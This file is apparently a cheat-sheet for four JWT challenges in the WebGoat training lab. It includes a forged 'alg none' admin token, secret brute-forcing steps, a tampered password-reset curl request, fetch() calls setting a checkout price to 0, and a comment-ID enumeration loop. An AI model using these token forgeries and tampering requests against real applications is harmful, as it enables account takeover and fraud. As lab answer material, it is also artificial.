@@ -1,0 +1,275 @@
+═══════════════════════════════════════════════════════════════════════════
+  ALL 4 JWT CHALLENGES - QUICK SOLUTION GUIDE
+═══════════════════════════════════════════════════════════════════════════
+
+PowerShell Script: .\jwt_automation.ps1 (already running)
+HTML Tool: jwt_complete_toolkit.html (already open)
+
+═══════════════════════════════════════════════════════════════════════════
+  🎯 CHALLENGE 1: BECOME ADMIN & RESET VOTES ✅ WORKING SOLUTION
+═══════════════════════════════════════════════════════════════════════════
+
+□ Step 1: F12 > Application > Cookies > http://192.168.254.112:8001
+□ Step 2: Copy "access_token" value
+□ Step 3: Replace with: eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjY1NjI5ODksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.
+□ Step 4: Double-click VALUE column, Delete, Paste, Enter
+□ Step 5: Click "Delete" button next to any user OR refresh (F5)
+□ DONE! ✓
+
+IMPORTANT NOTES:
+✓ Cookie is HttpOnly - MUST edit in DevTools (not JavaScript)
+✓ Token MUST end with dot: ...payload.
+✓ Algorithm must be "none" (lowercase)
+✓ Admin must be "true" (string, not boolean)
+
+PowerShell Method (if you need different timestamp):
+.\jwt_automation.ps1
+Type: 6
+Paste: YOUR_CURRENT_TOKEN
+Result: Attack token copied to clipboard
+
+═══════════════════════════════════════════════════════════════════════════
+  🔑 CHALLENGE 2: ADMIN LOST PASSWORD (MEDIUM)
+═══════════════════════════════════════════════════════════════════════════
+
+TRY IN THIS ORDER:
+
+ATTEMPT 1: Password in JWT Token
+──────────────────────────────────
+□ Get any JWT token from the page
+□ PowerShell > Type 1 > Paste token > Enter
+□ Look for fields: "password", "secret", "resetToken"
+□ If found, try logging in with that password!
+
+ATTEMPT 2: JWT Secret IS the Password
+───────────────────────────────────────
+□ Get JWT token
+□ PowerShell > Type 8 > Paste token > Enter
+□ Wait for brute force (tries common passwords)
+□ If secret found (e.g., "webgoat"), try logging in:
+   Username: admin
+   Password: [found_secret]
+
+ATTEMPT 3: Password Reset Tampering
+─────────────────────────────────────
+□ Click "Reset Password" for YOUR account
+□ Capture the reset JWT token (check email/URL/response)
+□ PowerShell > Type 10 > Paste token
+□ Target username: admin
+□ Choose option: 3 (algorithm none)
+□ Use tampered token to set admin password:
+
+curl -X POST http://192.168.254.112:8001/WebGoat/JWT/reset-password \
+  -H "Authorization: Bearer TAMPERED_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"password": "mynewpass123"}'
+
+□ Login: admin / mynewpass123
+
+MOST LIKELY: The secret is "webgoat" or "password"
+
+═══════════════════════════════════════════════════════════════════════════
+  💰 CHALLENGE 3: BUY SAMSUNG PHONE FOR FREE (MEDIUM)
+═══════════════════════════════════════════════════════════════════════════
+
+□ Step 1: Add Samsung Phone to cart
+□ Step 2: Go to checkout (DON'T complete yet)
+□ Step 3: F12 > Network tab > Clear > Click "Proceed to Checkout"
+□ Step 4: Find request with price info (look for POST to /checkout or /cart)
+□ Step 5: Copy JWT token from that request
+□ Step 6: PowerShell > Type 11 > Paste token
+□ Step 7: Field name: price
+□ Step 8: Value: 0
+□ Step 9: Copy tampered token
+□ Step 10: Replace in browser OR use console:
+
+fetch('http://192.168.254.112:8001/WebGoat/JWT/checkout', {
+  method: 'POST',
+  headers: {
+    'Authorization': 'Bearer TAMPERED_TOKEN',
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    item: 'Samsung Phone',
+    price: 0,
+    quantity: 1
+  })
+}).then(r => r.json()).then(console.log)
+
+□ DONE! Phone purchased for $0 ✓
+
+Other fields to try if "price" doesn't work:
+- total: 0
+- amount: 0
+- discount: 100
+
+═══════════════════════════════════════════════════════════════════════════
+  🚩 CHALLENGE 4: FIND FLAG IN PHOTO COMMENTS (HARD)
+═══════════════════════════════════════════════════════════════════════════
+
+□ Step 1: Go to photo comments section
+□ Step 2: Post a test comment to trigger JWT token
+□ Step 3: F12 > Network > Find comment request
+□ Step 4: Copy JWT token
+□ Step 5: PowerShell > Type 1 > Paste token (decode to see structure)
+□ Step 6: Look for access control fields:
+   - "canViewFlag": false
+   - "isAdmin": false
+   - "accessLevel": 1
+□ Step 7: Tamper token to gain access:
+   PowerShell > Type 2 (Make Admin)
+   OR
+   Type 11 > Field: canViewFlag > Value: true
+□ Step 8: Fetch all comments with tampered token:
+
+fetch('http://192.168.254.112:8001/WebGoat/JWT/comments', {
+  headers: {
+    'Authorization': 'Bearer TAMPERED_TOKEN'
+  }
+}).then(r => r.json()).then(data => {
+  console.log('All comments:', data);
+  // Look for flag in response
+  JSON.stringify(data).match(/flag\{.*?\}/)
+})
+
+□ Step 9: Try fetching specific comment IDs:
+
+for(let i=1; i<=100; i++) {
+  fetch(`http://192.168.254.112:8001/WebGoat/JWT/comments/${i}`, {
+    headers: {'Authorization': 'Bearer TAMPERED_TOKEN'}
+  })
+  .then(r => r.json())
+  .then(d => {
+    if(JSON.stringify(d).includes('flag')) {
+      console.log(`FLAG FOUND IN COMMENT ${i}:`, d);
+    }
+  })
+  .catch(()=>{});
+}
+
+□ Step 10: Submit found flag
+□ DONE! ✓
+
+═══════════════════════════════════════════════════════════════════════════
+  ⚡ SUPER QUICK CHEAT CODES
+═══════════════════════════════════════════════════════════════════════════
+
+Get Token:
+──────────
+F12 > Application > Cookies > access_token
+
+OR
+
+F12 > Console:
+document.cookie.split(';').find(c=>c.includes('token'))
+
+Decode Token:
+─────────────
+PowerShell: Type 1 > Paste
+
+OR
+
+Browser: jwt.io > Paste token
+
+Make Admin:
+───────────
+PowerShell: Type 2 > Paste
+
+Replace Token:
+──────────────
+F12 > Application > Cookies > Double-click value > Paste > Enter > F5
+
+Test if Admin:
+──────────────
+F12 > Console:
+fetch('http://192.168.254.112:8001/WebGoat/JWT/admin')
+  .then(r=>r.json()).then(console.log)
+
+═══════════════════════════════════════════════════════════════════════════
+  🎓 ATTACK DECISION TREE
+═══════════════════════════════════════════════════════════════════════════
+
+Got JWT Token?
+│
+├─> Try PowerShell Option 2 (Make Admin)
+│   ├─> Works? → Complete challenge! ✓
+│   └─> Fails? → Try Option 6 (Algorithm "none")
+│       ├─> Works? → Complete challenge! ✓
+│       └─> Fails? → Try Option 8 (Brute Force)
+│           └─> Found secret? → Option 9 (Sign new token)
+│               └─> Complete challenge! ✓
+│
+└─> If all fails: Read jwt_troubleshooting.txt
+
+═══════════════════════════════════════════════════════════════════════════
+  💾 SAVE THESE COMMANDS
+═══════════════════════════════════════════════════════════════════════════
+
+# Get cookie value
+document.cookie.split(';').find(c=>c.includes('access_token'))
+
+# Replace cookie
+document.cookie = "access_token=NEW_TOKEN; path=/"; location.reload();
+
+# Reset votes
+fetch('http://192.168.254.112:8001/WebGoat/JWT/votings/reset', {
+  method: 'POST'
+}).then(r=>r.json()).then(console.log)
+
+# Buy for free
+fetch('http://192.168.254.112:8001/WebGoat/JWT/checkout', {
+  method: 'POST',
+  headers: {'Authorization': 'Bearer TOKEN', 'Content-Type': 'application/json'},
+  body: JSON.stringify({item: 'Samsung Phone', price: 0, quantity: 1})
+}).then(r=>r.json()).then(console.log)
+
+# Get comments
+fetch('http://192.168.254.112:8001/WebGoat/JWT/comments', {
+  headers: {'Authorization': 'Bearer TOKEN'}
+}).then(r=>r.json()).then(console.log)
+
+# Search for flag in all comments
+for(let i=1; i<=100; i++) {
+  fetch(`http://192.168.254.112:8001/WebGoat/JWT/comments/${i}`, {
+    headers: {'Authorization': 'Bearer TOKEN'}
+  }).then(r=>r.json()).then(d=>{
+    if(JSON.stringify(d).includes('flag')) console.log('FOUND:', d)
+  }).catch(()=>{})
+}
+
+═══════════════════════════════════════════════════════════════════════════
+  ✅ COMPLETION CHECKLIST
+═══════════════════════════════════════════════════════════════════════════
+
+□ Challenge 1: Become Admin & Reset Votes
+  Method: Tamper admin: false → true
+  Status: __________
+
+□ Challenge 2: Admin Lost Password  
+  Method: Brute force or password reset tampering
+  Status: __________
+
+□ Challenge 3: Buy Samsung for Free
+  Method: Tamper price: 999 → 0
+  Status: __________
+
+□ Challenge 4: Find Flag in Comments
+  Method: Tamper for admin access → fetch comments
+  Status: __________
+
+═══════════════════════════════════════════════════════════════════════════
+  🆘 IF YOU GET STUCK
+═══════════════════════════════════════════════════════════════════════════
+
+1. Read: jwt_challenge1_walkthrough.txt (detailed step-by-step)
+2. Read: jwt_troubleshooting.txt (common issues)
+3. Check: jwt_payloads_library.txt (more examples)
+4. Try: HTML tool (jwt_complete_toolkit.html) for visual interface
+
+═══════════════════════════════════════════════════════════════════════════
+
+START WITH CHALLENGE 1 - IT'S THE EASIEST!
+
+PowerShell is running → Type 2 → Paste token → Replace in browser → Done!
+
+You got this! 🔐🎯
